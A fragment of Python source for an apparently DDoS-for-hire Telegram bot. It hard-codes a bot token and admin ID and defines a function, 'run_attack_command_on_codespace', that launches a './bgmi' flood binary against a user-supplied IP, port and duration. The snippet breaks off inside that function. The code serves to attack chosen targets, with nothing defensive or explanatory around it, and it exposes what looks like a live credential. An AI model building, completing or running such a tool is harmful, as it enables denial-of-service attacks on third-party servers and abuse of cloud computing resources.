...
# Bot token
TOKEN = '8465607651:AAFprRlJMWAC7joQ9zkhJmadfc6rWboVm64'
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# Admins list
ADMIN_IDS = [6062735907]  # Replace with actual admin user IDs
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./bgmi {target_ip} {target_port} {duration} 1900"
    try:
